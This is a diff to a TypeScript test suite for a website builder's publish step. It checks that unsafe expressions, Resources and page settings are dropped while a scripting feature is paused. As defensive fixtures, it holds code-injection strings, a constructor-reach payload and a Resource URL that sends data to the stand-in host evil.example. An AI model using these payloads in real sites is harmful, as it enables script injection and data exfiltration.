@@ -1,4 +1,4 @@
-import { readFileSync } from "node:fs";
+import { readFileSync, readdirSync } from "node:fs";
 import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
@@ -17,6 +17,7 @@ import {
   type Instance,
   type Page,
   type Prop,
+  type Resource,
   type WsComponentMeta,
 } from "@webstudio-is/sdk";
 import { standardAttributesToReactProps } from "@webstudio-is/react-sdk";
@@ -25,6 +26,7 @@ import * as radixComponentMetas from "@webstudio-is/sdk-components-react-radix/m
 import * as organizeosComponentMetas from "@organizeos/site-components/metas";
 import {
   checkAction,
+  findPausedExpressions,
   isEventAttributeName,
   isFrameDocumentName,
   isUrlPropName,
@@ -78,6 +80,7 @@ const bound = (instanceId: string, name: string, value: string) =>
 
 type PageInit = Pick<Page, "id" | "path" | "rootInstanceId"> & {
   meta?: Page["meta"];
+  title?: string;
 };
 
 const homeAndAbout: PageInit[] = [
@@ -90,18 +93,20 @@ const createBundle = ({
   instances = [],
   props = [],
   dataSources = [],
+  resources = [],
   redirects,
 }: {
   pages?: PageInit[];
   instances?: Array<[string, Instance]>;
   props?: Array<[string, Prop]>;
   dataSources?: PublishedProjectBundle["build"]["dataSources"];
+  resources?: PublishedProjectBundle["build"]["resources"];
   redirects?: Array<{ old: string; new: string; status?: "301" | "302" }>;
 } = {}): PublishedProjectBundle => {
-  const list = pages.map(({ meta = {}, ...page }) => ({
+  const list = pages.map(({ meta = {}, title, ...page }) => ({
     ...page,
     name: page.id,
-    title: `"${page.id}"`,
+    title: title ?? `"${page.id}"`,
     meta,
   }));
   return publishedProjectBundle.parse({
@@ -136,7 +141,7 @@ const createBundle = ({
       props,
       instances,
       dataSources,
-      resources: [],
+      resources,
       styleSources: [],
       styleSourceSelections: [],
       styles: [],
@@ -641,6 +646,19 @@ describe("dropOrgScript leaves unsafe values out", () => {
           },
         ],
       ],
+      // the Resource the resource data source names
+      resources: [
+        [
+          "res-resource",
+          {
+            id: "res-resource",
+            name: "res",
+            method: "get",
+            url: '"https://example.org/"',
+            headers: [],
+          },
+        ],
+      ],
     });
     const { result, log } = logOf(bundle);
 
@@ -992,6 +1010,19 @@ describe("dropOrgScript leaves unsafe values out", () => {
             name: "binding",
             scopeInstanceId: "root",
             resourceId: "res-1",
+          },
+        ],
+      ],
+      // the Resource the resource data source names
+      resources: [
+        [
+          "res-1",
+          {
+            id: "res-1",
+            name: "res",
+            method: "get",
+            url: '"https://example.org/"',
+            headers: [],
           },
         ],
       ],
@@ -1350,6 +1381,49 @@ describe("dropOrgScript leaves unsafe values out", () => {
 
   // A parameter is declared as itself only on the page that owns it, and a
   // Collection binds one item and one key
+  // A variable holds plain data only: nothing writes an element into one
+  test("drops a parameter or an expression named ref, counts it, and keeps one of another type", () => {
+    const variableSource = (id: string): [string, DataSource] => [
+      id,
+      {
+        type: "variable",
+        id,
+        name: id,
+        scopeInstanceId: "root",
+        value: { type: "json", value: {} },
+      },
+    ];
+    const bundle = createBundle({
+      pages: [{ id: "home", path: "", rootInstanceId: "root" }],
+      instances: [
+        instance({
+          id: "root",
+          component: "Body",
+          children: ids("named", "bound", "plain"),
+        }),
+        instance({ id: "named", component: "Box" }),
+        instance({ id: "bound", component: "Link" }),
+        instance({ id: "plain", component: "Box" }),
+        instance({ id: "orphan", component: "Box" }),
+      ],
+      props: [
+        prop("named", "ref", "parameter", "held"),
+        prop("bound", "ref", "expression", encodeDataSourceVariable("held")),
+        string("plain", "ref", "kept"),
+        prop("orphan", "ref", "parameter", "held"),
+        prop("plain", "data-ref", "parameter", "held"),
+      ],
+      dataSources: [variableSource("held")],
+    });
+    const { result, log } = logOf(bundle);
+
+    expect(propIds(result)).toEqual(["plain:ref", "plain:data-ref"]);
+    expect(log).toHaveBeenCalledWith(
+      "Org script is paused until OrganizeOS sites move to their own domain: left out 2 element references."
+    );
+    expect(dropOrgScript(bundle, { mayRun: true })).toBe(bundle);
+  });
+
   test("drops a page's own parameter held on the global root's id, both parameters a Collection with two item props names, and a Collection item that is not a parameter, and counts them", () => {
     const parameter = (
       id: string,
@@ -1900,6 +1974,8 @@ describe("dropOrgScript leaves unsafe values out", () => {
       "srcdoc",
       "event handler",
       "redirect",
+      "expression",
+      "Resource",
     ]) {
       expect(message).not.toContain(kind);
     }
@@ -1934,6 +2010,871 @@ describe("dropOrgScript leaves unsafe values out", () => {
     );
     expect(result.build.pages.pages).toEqual(bundle.build.pages.pages);
     expect(result.build.pages.redirects).toEqual(bundle.build.pages.redirects);
+    expect(result.build.resources).toEqual(bundle.build.resources);
+  });
+});
+
+// While org script is paused, publishing leaves out an expression that may not
+// run where it is published, and a Resource with one, as the
+// Publish dialog lists them (findPausedExpressions in
+// @organizeos/site-components/org-script, docs/ORGANIZEOS-FORK.md section 10).
+describe("dropOrgScript leaves expressions out", () => {
+  const item = encodeDataSourceVariable("item");
+  const variable = encodeDataSourceVariable("state");
+  const reach = '"".constructor';
+  const parameterProp = (instanceId: string, name: string, value: string) =>
+    prop(instanceId, name, "parameter", value);
+  const itemSource: [string, DataSource] = [
+    "item",
+    { type: "parameter", id: "item", name: "process", scopeInstanceId: "list" },
+  ];
+  const stateSource: [string, DataSource] = [
+    "state",
+    {
+      type: "variable",
+      id: "state",
+      name: "state",
+      scopeInstanceId: "root",
+      value: { type: "string", value: "idle" },
+    },
+  ];
+  const resourceSource = (resourceId: string): [string, DataSource] => [
+    `${resourceId}-ds`,
+    {
+      type: "resource",
+      id: `${resourceId}-ds`,
+      name: resourceId,
+      scopeInstanceId: "root",
+      resourceId,
+    },
+  ];
+  const resource = (
+    resourceId: string,
+    init: Partial<Resource> = {}
+  ): [string, Resource] => [
+    resourceId,
+    {
+      id: resourceId,
+      name: resourceId,
+      method: "get",
+      url: `"https://example.org/${resourceId}"`,
+      headers: [],
+      ...init,
+    },
+  ];
+  const withList = (extra: Array<[string, Instance]> = []) => [
+    instance({
+      id: "root",
+      component: "Body",
+      children: ids("box", "list", ...extra.map(([id]) => id)),
+    }),
+    instance({ id: "box", component: "Box" }),
+    instance({
+      id: "list",
+      component: "ws:collection",
+      children: ids("inner"),
+    }),
+    instance({ id: "inner", component: "Box" }),
+    ...extra,
+  ];
+
+  // A parameter prop that names a Collection's item outside it takes the
+  // item with it (collidingDataSourceIds); an expression that does goes alone
+  test("drops an expression that may not run where it is written, an XML page's included, and counts it", () => {
+    const bundle = createBundle({
+      pages: [
+        { id: "home", path: "", rootInstanceId: "root" },
+        {
+          id: "sitemap",
+          path: "/sitemap.xml",
+          rootInstanceId: "xml-root",
+          meta: { documentType: "xml" },
+        },
+      ],
+      instances: [
+        ...withList(),
+        instance({ id: "xml-root", component: "Body", children: ids("node") }),
+        instance({ id: "node", component: "XmlNode" }),
+      ],
+      props: [
+        bound("box", "title", '"x"} data-x={1'),
+        bound("box", "data-ws-show", "false) || (1"),
+        bound("box", "data-item", `${item}.title`),
+        string("box", "id", "box"),
+        bound("list", "data", reach),
+        parameterProp("list", "item", "item"),
+        bound("inner", "title", `${item}.title`),
+        parameterProp("inner", "data-entry", "item"),
+        bound("node", "tag", '"loc"'),
+        bound("node", "title", '"x"} data-x={1'),
+      ],
+      dataSources: [itemSource],
+    });
+    const { result, log } = logOf(bundle);
+
+    expect(propIds(result)).toEqual([
+      "box:id",
+      "list:item",
+      "inner:title",
+      "inner:data-entry",
+      "node:tag",
+    ]);
+    expect(log).toHaveBeenCalledWith(
+      "Org script is paused until OrganizeOS sites move to their own domain: left out 5 expressions."
+    );
+  });
+
+  // Input validation (code-check.ts) is the outer layer: what it refuses
+  // goes before it runs, counted where a page publishes it
+  test("leaves out what input validation refuses, counted where a page publishes it, so input validation passes what ships", () => {
+    const bundle = createBundle({
+      pages: [{ id: "home", path: "", rootInstanceId: "root" }],
+      instances: [
+        ...withList(),
+        instance({
+          id: "orphan",
+          component: "Box",
+          children: [{ type: "expression", value: "a()" }],
+        }),
+      ],
+      props: [
+        bound("box", "title", "({constructor: 1})"),
+        bound("box", "alt", `${variable}.length`),
+        bound("orphan", "title", "a()"),
+      ],
+      dataSources: [stateSource, resourceSource("news")],
+      resources: [
+        resource("news", { headers: [{ name: "X Custom", value: '"1"' }] }),
+        resource("unused", { url: "a()" }),
+      ],
+    });
+    const [home] = bundle.build.pages.pages;
+    const withTemplate: PublishedProjectBundle = {
+      ...bundle,
+      build: {
+        ...bundle.build,
+        pages: {
+          ...bundle.build.pages,
+          pages: [{ ...home, meta: { ...home.meta, title: "a()" } }],
+          pageTemplates: [
+            {
+              id: "template",
+              name: "Template",
+              title: "a()",
+              rootInstanceId: "orphan",
+              meta: { description: '"x"' },
+            },
+          ],
+        } as unknown as PublishedProjectBundle["build"]["pages"],
+      },
+    };
+    expect(() =>
+      assertBuildCodeValid(
+        withTemplate.build,
+        migratePages(withTemplate.build.pages)
+      )
+    ).toThrow();
+    const { result, log } = logOf(withTemplate);
+
+    expect(() =>
+      assertBuildCodeValid(result.build, migratePages(result.build.pages))
+    ).not.toThrow();
+    expect(propIds(result)).toEqual(["box:alt"]);
+    expect(result.build.resources).toEqual([]);
+    expect(
+      result.build.instances.find(([id]) => id === "orphan")?.[1].children
+    ).toEqual([{ type: "expression", value: "undefined" }]);
+    expect(result.build.pages.pages[0].meta.title).toBeUndefined();
+    expect(
+      (
+        result.build.pages as unknown as {
+          pageTemplates: Array<{ title: string; meta: Page["meta"] }>;
+        }
+      ).pageTemplates[0]
+    ).toMatchObject({ title: '""', meta: { description: '"x"' } });
+    expect(log).toHaveBeenCalledWith(
+      "Org script is paused until OrganizeOS sites move to their own domain: left out 1 expression and 1 Resource."
+    );
+  });
+
+  test("drops an expression, a page setting and a Resource that name a data source publishing leaves out, and counts them", () => {
+    const embedSource: [string, DataSource] = [
+      "embed-state",
+      {
+        type: "variable",
+        id: "embed-state",
+        name: "embedState",
+        scopeInstanceId: "embed",
+        value: { type: "string", value: "" },
+      },
+    ];
+    const boxSource: [string, DataSource] = [
+      "Box",
+      {
+        type: "variable",
+        id: "Box",
+        name: "tag",
+        scopeInstanceId: "root",
+        value: { type: "string", value: "" },
+      },
+    ];
+    const bundle = createBundle({
+      pages: [
+        {
+          id: "home",
+          path: "",
+          rootInstanceId: "root",
+          meta: {
+            description: `${encodeDataSourceVariable("broken-ds")}.data`,
+          },
+        },
+      ],
+      instances: [
+        ...withList([instance({ id: "embed", component: "HtmlEmbed" })]),
+      ],
+      props: [
+        string("embed", "code", "<b>x</b>"),
+        bound("box", "title", `${encodeDataSourceVariable("Box")}.length`),
+        bound("box", "data-embed", encodeDataSourceVariable("embed-state")),
+        bound("box", "alt", `${variable}.length`),
+      ],
+      dataSources: [
+        stateSource,
+        embedSource,
+        boxSource,
+        resourceSource("broken"),
+        resourceSource("named"),
+      ],
+      resources: [
+        resource("broken", { url: "a()" }),
+        resource("named", {
+          headers: [
+            {
+              name: "x-embed",
+              value: encodeDataSourceVariable("embed-state"),
+            },
+          ],
+        }),
+      ],
+    });
+    const { result, log } = logOf(bundle);
+
+    expect(propIds(result)).toEqual(["box:alt"]);
+    expect(result.build.resources).toEqual([]);
+    expect(result.build.pages.pages[0].meta.description).toBeUndefined();
+    expect(log).toHaveBeenCalledWith(
+      "Org script is paused until OrganizeOS sites move to their own domain: left out 1 HTML Embed, 1 variable with a conflicting id, 3 expressions and 2 Resources."
+    );
+  });
+
+  // An expression holds no comment, and an object literal no shorthand
+  // property
+  test("drops an expression that holds a comment or a shorthand property, and counts it", () => {
+    const bundle = createBundle({
+      instances: withList(),
+      props: [
+        bound("box", "title", `${variable} /* x */ .length`),
+        bound("box", "data-x", `({${variable}})`),
+        bound("inner", "title", `${variable}.length`),
+      ],
+      dataSources: [stateSource],
+    });
+    const { result, log } = logOf(bundle);
+
+    expect(propIds(result)).toEqual(["inner:title"]);
+    expect(log).toHaveBeenCalledWith(
+      "Org script is paused until OrganizeOS sites move to their own domain: left out 2 expressions."
+    );
+  });
+
+  test("drops a Collection's item or itemKey that is not a parameter", () => {
+    const bundle = createBundle({
+      instances: withList(),
+      props: [
+        bound("list", "data", "[1]"),
+        bound("list", "item", "item"),
+        string("list", "itemKey", "key"),
+      ],
+    });
+    expect(propIds(dropOrgScript(bundle))).toEqual(["list:data"]);
+  });
+
+  test("writes undefined for a text child that may not run, and keeps the other children in place", () => {
+    const bundle = createBundle({
+      instances: withList([
+        instance({
+          id: "text",
+          component: "Text",
+          children: [
+            { type: "text", value: "Hello" },
+            { type: "expression", value: '"t") && (1' },
+            { type: "expression", value: variable },
+            { type: "id", value: "box" },
+          ],
+        }),
+      ]),
+      dataSources: [stateSource],
+    });
+    const { result, log } = logOf(bundle);
+
+    expect(childrenOf(result, "text")).toEqual([
+      { type: "text", value: "Hello" },
+      { type: "expression", value: "undefined" },
+      { type: "expression", value: variable },
+      { type: "id", value: "box" },
+    ]);
+    expect(log).toHaveBeenCalledWith(
+      "Org script is paused until OrganizeOS sites move to their own domain: left out 1 expression."
+    );
+  });
+
+  test("drops a page setting that may not run: the title becomes empty, the redirect goes with its 3xx status, and so does a custom entry", () => {
+    const bundle = createBundle({
+      pages: [
+        {
+          id: "home",
+          path: "",
+          rootInstanceId: "root",
+          title: reach,
+          meta: {
+            description: `"Kept"`,
+            language: reach,
+            excludePageFromSearch: `${item}.x`,
+            status: "301",
+            redirect: `"/" + ${reach}`,
+            custom: [
+              { property: "og:x", content: reach },
+              { property: "og:type", content: '"website"' },
+            ],
+          },
+        },
+        {
+          id: "about",
+          path: "/about",
+          rootInstanceId: "about-root",
+          meta: { status: reach, socialImageUrl: reach, content: reach },
+        },
+      ],
+      instances: [
+        ...withList(),
+        instance({ id: "about-root", component: "Body" }),
+      ],
+      props: [parameterProp("list", "item", "item")],
+      dataSources: [itemSource],
+    });
+    const { result, log } = logOf(bundle);
+
+    expect(
+      result.build.pages.pages.map(({ id, title, meta }) => ({
+        id,
+        title,
+        meta,
+      }))
+    ).toEqual([
+      {
+        id: "home",
+        title: '""',
+        meta: {
+          description: `"Kept"`,
+          custom: [{ property: "og:type", content: '"website"' }],
+        },
+      },
+      { id: "about", title: '"about"', meta: {} },
+    ]);
+    expect(log).toHaveBeenCalledWith(
+      "Org script is paused until OrganizeOS sites move to their own domain: left out 7 expressions and 1 redirect to an unsafe address."
+    );
+  });
+
+  test("drops a Resource that may not run with its data sources and the resource props that name it, and counts it", () => {
+    const bundle = createBundle({
+      instances: withList([instance({ id: "form", component: "Form" })]),
+      props: [
+        prop("form", "action", "resource", "leak"),
+        bound("box", "title", `${encodeDataSourceVariable("leak-ds")}.data`),
+        parameterProp("list", "item", "item"),
+      ],
+      dataSources: [
+        itemSource,
+        resourceSource("first"),
+        resourceSource("leak"),
+        resourceSource("kept"),
+      ],
+      resources: [
+        resource("first"),
+        // a Collection's item, which a Resource may not name
+        resource("leak", {
+          url: `"https://evil.example/?k=" + ${item}`,
+        }),
+        resource("kept", {
+          url: '"https://example.org/items/" + ($ws$system.params.slug ?? "-")',
+          searchParams: [{ name: "state", value: variable }],
+        }),
+      ],
+    });
+    const { result, log } = logOf(bundle);
+
+    expect(result.build.resources.map(([id]) => id)).toEqual(["first", "kept"]);
+    expect(result.build.dataSources.map(([id]) => id)).toEqual([
+      "item",
+      "first-ds",
+      "kept-ds",
+    ]);
+    // what read the Resource goes too
+    expect(propIds(result)).toEqual(["list:item"]);
+    expect(log).toHaveBeenCalledWith(
+      "Org script is paused until OrganizeOS sites move to their own domain: left out 1 expression and 1 Resource."
+    );
+  });
+
+  test("drops a Resource whose header or search name is not plain", () => {
+    const bundle = createBundle({
+      instances: withList(),
+      dataSources: [resourceSource("named"), resourceSource("searched")],
+      resources: [
+        resource("named", {
+          headers: [{ name: 'x"y', value: '"1"' }],
+        }),
+        resource("searched", {
+          searchParams: [{ name: 'q"', value: '"1"' }],
+        }),
+      ],
+    });
+    const { result, log } = logOf(bundle);
+
+    expect(result.build.resources).toEqual([]);
+    expect(result.build.dataSources).toEqual([]);
+    expect(log).toHaveBeenCalledWith(
+      "Org script is paused until OrganizeOS sites move to their own domain: left out 2 Resources."
+    );
+  });
+
+  // What publishing counts, the Publish dialog lists: a prop of an instance
+  // no page publishes once what goes has gone is not counted
+  test("counts no action of an instance that only an instance on no page holds once what goes has gone", () => {
+    const bundle = createBundle({
+      instances: [
+        instance({ id: "root", component: "Body", children: ids("embed") }),
+        instance({
+          id: "embed",
+          component: "HtmlEmbed",
+          children: ids("held"),
+        }),
+        instance({ id: "orphan", component: "Box", children: ids("held") }),
+        instance({ id: "held", component: "Box" }),
+      ],
+      props: [
+        string("embed", "code", "<script>1</script>"),
+        prop("held", "onClick", "action", [
+          {
+            type: "execute",
+            args: [],
+            code: `${variable} = $ws$dataSource$inner`,
+          },
+        ]),
+      ],
+      dataSources: [
+        stateSource,
+        [
+          "inner",
+          {
+            type: "variable",
+            id: "inner",
+            name: "inner",
+            scopeInstanceId: "embed",
+            value: { type: "string", value: "" },
+          },
+        ],
+      ],
+    });
+    const { result, log } = logOf(bundle);
+
+    expect(propIds(result)).toEqual([]);
+    expect(log).toHaveBeenCalledWith(
+      "Org script is paused until OrganizeOS sites move to their own domain: left out 1 HTML Embed."
+    );
+  });
+
+  test("counts nothing that sits only in a Content Block's templates, nor what an instance dropped anyway holds", () => {
+    const bundle = createBundle({
+      instances: [
+        instance({
+          id: "root",
+          component: "Body",
+          children: ids("block", "embed"),
+        }),
+        instance({
+          id: "block",
+          component: "ws:block",
+          children: ids("templates"),
+        }),
+        instance({
+          id: "templates",
+          component: "ws:block-template",
+          children: ids("template"),
+        }),
+        instance({
+          id: "template",
+          component: "Box",
+          children: [{ type: "expression", value: reach }],
+        }),
+        instance({
+          id: "embed",
+          component: "HtmlEmbed",
+          children: ids("inside"),
+        }),
+        instance({
+          id: "inside",
+          component: "Box",
+          children: [{ type: "expression", value: reach }],
+        }),
+      ],
+      props: [
+        bound("template", "title", reach),
+        bound("inside", "title", reach),
+      ],
+    });
+    const { log } = logOf(bundle);
+
+    expect(log).toHaveBeenCalledWith(
+      "Org script is paused until OrganizeOS sites move to their own domain: left out 1 HTML Embed."
+    );
+  });
+
+  // what read it goes too
+  test("drops a data source the page module would name like a global it reads, and counts it", () => {
+    const bundle = createBundle({
+      instances: withList(),
+      props: [
+        bound("inner", "title", encodeDataSourceVariable("builtin")),
+        bound("list", "data", variable),
+      ],
+      dataSources: [
+        stateSource,
+        [
+          "builtin",
+          {
+            type: "variable",
+            id: "builtin",
+            name: "Object",
+            scopeInstanceId: "root",
+            value: { type: "string", value: "" },
+          },
+        ],
+      ],
+    });
+    const { result, log } = logOf(bundle);
+
+    expect(result.build.dataSources.map(([id]) => id)).toEqual(["state"]);
+    expect(propIds(result)).toEqual(["list:data"]);
+    // the shared rule for a data source's name lists it first
+    expect(log).toHaveBeenCalledWith(
+      "Org script is paused until OrganizeOS sites move to their own domain: left out 1 variable with a conflicting id and 1 expression."
+    );
+  });
+
+  // The Publish dialog lists the same two (organizeos-publish-paused-script.test.ts)
+  test("drops a global data source named like one of the module's own names, and what names it, and counts both", () => {
+    const bundle = createBundle({
+      instances: withList(),
+      props: [bound("box", "title", encodeDataSourceVariable("docs"))],
+      dataSources: [
+        [
+          "docs",
+          {
+            type: "variable",
+            id: "docs",
+            name: "documents",
+            scopeInstanceId: ROOT_INSTANCE_ID,
+            value: { type: "string", value: "" },
+          },
+        ],
+      ],
+    });
+    const { result, log } = logOf(bundle);
+
+    expect(result.build.dataSources).toEqual([]);
+    expect(propIds(result)).toEqual([]);
+    expect(log).toHaveBeenCalledWith(
+      "Org script is paused until OrganizeOS sites move to their own domain: left out 1 expression and 1 data source."
+    );
+  });
+
+  // The Publish dialog lists the same (organizeos-publish-paused-script.test.ts)
+  test("counts a Resource or a data source that goes only where an instance that ships holds it", () => {
+    const bundle = createBundle({
+      instances: [
+        instance({
+          id: "root",
+          component: "Body",
+          children: ids("node", "other"),
+        }),
+        instance({
+          id: "node",
+          component: "XmlNode",
+          children: ids("form", "box"),
+        }),
+        instance({ id: "form", component: "Box" }),
+        instance({ id: "box", component: "Box" }),
+        instance({ id: "other", component: "Box" }),
+      ],
+      props: [
+        prop("form", "action", "resource", "sent"),
+        prop("other", "action", "resource", "sent"),
+        prop("box", "action", "resource", "lost"),
+      ],
+      dataSources: [
+        [
+          "loaded",
+          {
+            type: "resource",
+            id: "loaded",
+            name: "loaded",
+            scopeInstanceId: "box",
+            resourceId: "feed",
+          },
+        ],
+        [
+          "docs",
+          {
+            type: "variable",
+            id: "docs",
+            name: "documents",
+            scopeInstanceId: "box",
+            value: { type: "string", value: "" },
+          },
+        ],
+      ],
+      resources: [
+        resource("sent", { name: "Map", method: "post" }),
+        resource("lost", { name: "Number", method: "post" }),
+        resource("feed", { url: '"https://example.org/?k=" + (0 < 1 > 2)' }),
+      ],
+    });
+    const { result, log } = logOf(bundle);
+
+    expect(instanceIds(result)).toEqual(["root", "other"]);
+    expect(result.build.dataSources).toEqual([]);
+    expect(propIds(result)).toEqual([]);
+    expect(log).toHaveBeenCalledWith(
+      "Org script is paused until OrganizeOS sites move to their own domain: left out 1 XML element on an HTML page and 1 Resource."
+    );
+  });
+
+  // A data source whose id is another of the page module's names goes
+  // (collidingDataSourceIds), and so does what names it
+  test("drops a data source whose id the page module already gives another name, and an action that names it, and counts it", () => {
+    const bundle = createBundle({
+      instances: withList(),
+      props: [
+        bound("box", "title", encodeDataSourceVariable("Box")),
+        prop("inner", "onClick", "action", [
+          {
+            type: "execute",
+            args: [],
+            code: `${variable} = ${encodeDataSourceVariable("Box")}`,
+          },
+        ]),
+      ],
+      dataSources: [
+        stateSource,
+        [
+          "Box",
+          {
+            type: "variable",
+            id: "Box",
+            name: "box",
+            scopeInstanceId: "root",
+            value: { type: "string", value: "" },
+          },
+        ],
+      ],
+    });
+    const { result, log } = logOf(bundle);
+
+    expect(result.build.dataSources.map(([id]) => id)).toEqual(["state"]);
+    expect(propIds(result)).toEqual([]);
+    expect(log).toHaveBeenCalledWith(
+      "Org script is paused until OrganizeOS sites move to their own domain: left out 1 unsafe action, 1 variable with a conflicting id and 1 expression."
+    );
+  });
+
+  test("drops a resource data source and a resource prop that name a Resource the build does not hold, and counts the Resource", () => {
+    const bundle = createBundle({
+      instances: withList([instance({ id: "form", component: "Form" })]),
+      props: [
+        prop("form", "action", "resource", "absent-action"),
+        bound("box", "title", `${encodeDataSourceVariable("absent-ds")}.data`),
+      ],
+      dataSources: [resourceSource("absent"), resourceSource("kept")],
+      resources: [resource("kept")],
+    });
+    const { result, log } = logOf(bundle);
+
+    expect(result.build.resources.map(([id]) => id)).toEqual(["kept"]);
+    expect(result.build.dataSources.map(([id]) => id)).toEqual(["kept-ds"]);
+    // what read the data source goes too
+    expect(propIds(result)).toEqual([]);
+    expect(log).toHaveBeenCalledWith(
+      "Org script is paused until OrganizeOS sites move to their own domain: left out 1 expression and 2 Resources."
+    );
+  });
+
+  test("judges an action against the data sources that ship", () => {
+    const action = (code: string) =>
+      prop("box", "onClick", "action", [{ type: "execute", args: [], code }]);
+    const bundle = createBundle({
+      instances: withList(),
+      props: [action(`${variable} = ${encodeDataSourceVariable("leak-ds")}`)],
+      dataSources: [stateSource, resourceSource("leak")],
+      resources: [
+        resource("leak", { url: '"https://example.org/" + /x/.source' }),
+      ],
+    });
+    const { result, log } = logOf(bundle);
+
+    expect(result.build.dataSources.map(([id]) => id)).toEqual(["state"]);
+    expect(propIds(result)).toEqual([]);
+    expect(log).toHaveBeenCalledWith(
+      "Org script is paused until OrganizeOS sites move to their own domain: left out 1 unsafe action and 1 Resource."
+    );
+  });
+
+  test("reads the last entry of a page id, as publishing does", () => {
+    const bundle = createBundle({
+      pages: [
+        { id: "home", path: "", rootInstanceId: "root" },
+        { id: "twice", path: "/first", rootInstanceId: "first-root" },
+        { id: "twice", path: "/last", rootInstanceId: "last-root" },
+      ],
+      instances: [
+        ...withList(),
+        instance({ id: "first-root", component: "Body" }),
+        instance({ id: "last-root", component: "Body", children: ids("last") }),
+        instance({ id: "last", component: "Box" }),
+      ],
+      props: [bound("last", "title", reach)],
+    });
+    const { result, log } = logOf(bundle);
+
+    expect(propIds(result)).toEqual([]);
+    expect(log).toHaveBeenCalledWith(
+      "Org script is paused until OrganizeOS sites move to their own domain: left out 1 duplicate entry and 1 expression."
+    );
+  });
+
+  test("counts a Resource that only a Content Block's templates load, as the page loads it", () => {
+    const bundle = createBundle({
+      instances: [
+        instance({ id: "root", component: "Body", children: ids("block") }),
+        instance({
+          id: "block",
+          component: "ws:block",
+          children: ids("templates"),
+        }),
+        instance({
+          id: "templates",
+          component: "ws:block-template",
+          children: ids("template"),
+        }),
+        instance({ id: "template", component: "Form" }),
+      ],
+      props: [prop("template", "action", "resource", "leak")],
+      resources: [resource("leak", { url: reach })],
+    });
+    const { result, log } = logOf(bundle);
+
+    expect(result.build.resources).toEqual([]);
+    expect(propIds(result)).toEqual([]);
+    expect(log).toHaveBeenCalledWith(
+      "Org script is paused until OrganizeOS sites move to their own domain: left out 1 Resource."
+    );
+  });
+
+  test("returns the same bundle when every expression and Resource may run", () => {
+    const bundle = createBundle({
+      pages: [
+        {
+          id: "home",
+          path: "",
+          rootInstanceId: "root",
+          title: `${encodeDataSourceVariable("kept-ds")}.data.title ?? "Home"`,
+          meta: {
+            description: '""',
+            status: "200",
+            excludePageFromSearch: "false",
+            custom: [{ property: "og:type", content: '"website"' }],
+          },
+        },
+      ],
+      instances: withList(),
+      props: [
+        bound(
+          "list",
+          "data",
+          `(${encodeDataSourceVariable("kept-ds")}.ok === true ? ${encodeDataSourceVariable("kept-ds")}.data.data.slice(0, 1) : [])`
+        ),
+        parameterProp("list", "item", "item"),
+        bound("inner", "href", `"/events/" + ${item}.slug`),
+        bound(
+          "box",
+          "data-ws-show",
+          `${variable} === 'initial' || ${variable} === 'error'`
+        ),
+      ],
+      dataSources: [itemSource, stateSource, resourceSource("kept")],
+      resources: [
+        resource("kept", {
+          url: '"https://example.org/items/" + ($ws$system.params.slug ?? "-")',
+          headers: [{ name: "Authorization", value: '"Bearer x"' }],
+          body: "",
+        }),
+      ],
+    });
+    const { result, log } = logOf(bundle);
+
+    expect(result).toBe(bundle);
+    expect(log).not.toHaveBeenCalled();
+  });
+
+  // The fixtures are upstream's projects and the templates', published as
+  // they are; every expression they hold may run where it is written
+  test("finds nothing in any fixture project", () => {
+    const fixtures = readdirSync(
+      fileURLToPath(new URL("../../../fixtures", import.meta.url)),
+      { withFileTypes: true }
+    ).filter((entry) => entry.isDirectory());
+    expect(fixtures.length).toBeGreaterThanOrEqual(8);
+    let expressions = 0;
+    for (const fixture of fixtures) {
+      const { build } = publishedProjectBundle.parse(
+        JSON.parse(
+          readFileSync(
+            fileURLToPath(
+              new URL(
+                `../../../fixtures/${fixture.name}/.webstudio/data.json`,
+                import.meta.url
+              )
+            ),
+            "utf8"
+          )
+        )
+      );
+      expressions += build.props.filter(
+        ([, { type }]) => type === "expression"
+      ).length;
+      expect(
+        findPausedExpressions({
+          pages: build.pages.pages,
+          instances: new Map(build.instances),
+          props: build.props.map(([, item]) => item),
+          dataSources: new Map(build.dataSources),
+          resources: new Map(build.resources),
+        }),
+        fixture.name
+      ).toEqual([]);
+    }
+    expect(expressions).toBeGreaterThan(10);
   });
 });
 
